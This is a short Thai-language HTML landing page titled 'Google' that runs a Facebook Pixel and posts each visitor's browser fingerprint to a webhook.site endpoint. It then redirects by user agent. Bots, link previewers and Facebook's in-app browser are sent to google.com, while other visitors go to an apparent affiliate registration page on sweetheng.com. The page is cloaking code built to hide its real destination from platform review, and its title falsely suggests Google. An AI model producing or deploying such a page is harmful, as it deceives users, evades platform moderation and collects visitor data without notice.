<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google</title>
  <script>
    // Facebook Pixel
    !function(f,b,e,v,n,t,s){
      if(f.fbq)return;n=f.fbq=function(){
        n.callMethod? n.callMethod.apply(n,arguments):n.queue.push(arguments)
      };
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)
    }(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '703410278985466');
    fbq('track', 'PageView');
  </script>
</head>
<body>
  <h1>กำลังโหลด...</h1>
  <script>
    // ตรวจสอบ UA
    const ua = navigator.userAgent.toLowerCase();
    const isBot = /bot|crawl|spider|preview|whatsapp|line|twitter/i.test(ua);
    const isFacebookBrowser = ua.includes("fbav") || ua.includes("fban");

    // ส่งข้อมูลไป webhook
    fetch("https://webhook.site/your-custom-url", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: new Date().toISOString()
      })
    });

    // redirect ตามเงื่อนไข
    if (isBot || isFacebookBrowser) {
      window.location.href = "https://www.google.com/";
    } else {
      window.location.href = "https://sweetheng.com/register?partner_ref=ttkk";
    }
  </script>
</body>
</html>
